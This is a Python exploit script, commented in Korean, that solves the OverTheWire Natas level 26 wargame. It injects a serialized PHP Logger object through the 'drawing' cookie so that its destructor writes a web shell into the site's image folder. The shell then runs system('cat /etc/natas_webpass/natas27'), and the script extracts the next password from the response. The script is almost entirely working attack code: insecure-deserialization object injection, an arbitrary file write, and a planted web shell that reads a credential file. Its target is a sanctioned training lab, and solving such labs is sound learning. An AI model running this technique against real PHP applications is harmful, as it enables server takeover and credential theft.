import requests
import sys
import base64
import re

boundary = "=" * 60

if len(sys.argv) != 2:
    print(boundary)
    print("[-] 실행 포멧을 지키지 않았습니다. 아래와 같이 입력하여 실행하세요")
    print(f"python {sys.argv[0]} natas26_password")
    print(boundary)
    sys.exit(0)

url = "http://natas26.natas.labs.overthewire.org/"
natas26_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas26", natas26_cred)

# ── 직렬화 페이로드 구성 ──────────────────────────────────────
# natas26은 drawing 쿠키를 base64 디코드 후 unserialize() 한다.
# Logger 객체를 직접 직렬화해서 넣으면, 역직렬화 시점에 __destruct가
# $this->logFile 경로에 $this->exitMsg 내용을 그대로 기록한다.
#   → logFile 에 웹 접근 가능한 .php 경로.
#     exitMsg 에 웹셸 코드를 넣어 임의 PHP 파일을 작성하도록 함.
# 객체가 private라 \x00Logger\x00<prop> 로 널바이트를 붙여줘야함
exploit_shell_path = "img/natas27_shell1.php"
exploit_payload = "<?php echo 'natas27_password is '; echo system('cat /etc/natas_webpass/natas27')\n; ?>"
serial_cookies = (
    'O:6:"Logger":2:{'
    f's:15:"\x00Logger\x00exitMsg";s:{len(exploit_payload.encode())}:"{exploit_payload}";'
    f's:15:"\x00Logger\x00logFile";s:{len(exploit_shell_path)}:"{exploit_shell_path}";'

    '}'
)

print(serial_cookies)
# 서버가 base64 디코드 후 역직렬화하므로, 보내기 전에 base64 인코딩
exploit_cookies = base64.b64encode(serial_cookies.encode('latin-1')).decode()
cookie_payload = {"drawing": exploit_cookies}


# ── ① 트리거 요청 ────────────────────────────────────────────
# 이 GET 요청으로 서버에서 unserialize()가 실행되고,
# 요청 처리가 끝날 때 __destruct가 셸 파일을 디스크에 기록한다.
s.get(url, cookies=cookie_payload)


# 서버로 전송한 직렬화 페이로드 쿠키 (디버그용 출력)
print(boundary)
print("서버에 전송한 직렬화 쿠키 (base64)")
print(boundary)
print(f"{cookie_payload['drawing']}")
print(boundary)


# ── ② 실행 요청 ─────────────────────────────────────────────
# 방금 기록된 웹셸 파일을 직접 호출 → PHP가 실행되며 비번을 출력한다.
shell_url = url + exploit_shell_path
response = s.get(shell_url)


# 응답(system 출력)에서 natas 특성상 비밀번호가 32자이기 때문에, 필요없는 값이 나오지 않도록 함.
password = re.search(r"natas27_password is\s*([a-zA-Z0-9]{32})", response.text)


# 비밀번호 출력 및 예외 처리
if password:
    print(f"natas27 비밀번호 ====> {password.group(1)}")
    print(boundary)
else:
    print("아래 응답 전체 html 코드를 다시 확인해주세요")
    print(response.text)
    print(boundary)
